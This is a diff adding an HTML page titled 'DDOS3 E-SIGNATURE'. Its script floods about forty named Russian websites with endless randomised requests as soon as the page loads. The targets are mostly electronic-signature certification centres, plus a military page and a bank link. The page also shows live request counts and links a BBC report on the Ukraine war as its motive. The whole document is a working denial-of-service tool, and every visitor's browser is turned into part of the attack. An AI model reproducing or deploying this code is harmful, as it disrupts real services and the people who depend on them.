@@ -1,0 +1,108 @@
+<head>
+    <title>DDOS3 E-SIGNATURE</title>
+</head>
+
+<body>
+
+<h3>Here is the stats of your session (the links and the number of the requests that were sent from
+    your browser):</h3>
+<div id="stats"></div>
+<div id="errors"></div>
+<p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine
+    conflict: Russian forces attack from three sides</a></p>
+</body>
+<script>
+var targets = {
+"https://iecp.ru/ep/ep-verification" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://iecp.ru/ep/uc-list" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://uc-osnovanie.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.nucrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.belinfonalog.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.roseltorg.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.astralnalog.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.nwudc.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.center-inform.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://kk.bank/UdTs" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://structure.mil.ru/structure/uc/info.htm" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.ucpir.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://dreamkas.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.e-portal.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://izhtender.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://imctax.parus-s.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.icentr.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.kartoteka.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://rsbis.ru/elektronnaya-podpis" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.stv-it.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.crypset.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.kt-69.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.24ecp.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://kraskript.com" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://ca.ntssoft.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.y-center.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.rcarus.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://rk72.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://squaretrade.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://ca.gisca.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.otchet-online.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://udcs.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.cit-ufa.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://elkursk.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.icvibor.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://ucestp.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://mcspro.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.infotrust.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://epnow.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://ca.kamgov.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://mascom-it.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://cfmc.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+
+}
+
+var statsEl = document.getElementById('stats');
+function printStats() {
+statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+}
+setInterval(printStats, 1000);
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+async function fetchWithTimeout(resource, options) {
+const controller = new AbortController();
+const id = setTimeout(() => controller.abort(), options.timeout);
+return fetch(resource, {
+method: 'GET',
+mode: 'no-cors',
+signal: controller.signal
+}).then((response) => {
+clearTimeout(id);
+return response;
+}).catch((error) => {
+clearTimeout(id);
+throw error;
+});
+}
+async function flood(target) {
+for (var i = 0;; ++i) {
+if (queue.length > CONCURRENCY_LIMIT) {
+await queue.shift()
+}
+rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+queue.push(
+fetchWithTimeout(target+rand, { timeout: 1000 })
+.catch((error) => {
+if (error.code === 20 /* ABORT */) {
+return;
+}
+targets[target].number_of_errored_responses++;
+})
+.then((response) => {
+if (response && !response.ok) {
+targets[target].number_of_errored_responses++;
+}
+targets[target].number_of_requests++;
+})
+)
+}
+}
+
+Object.keys(targets).map(flood)
+</script>
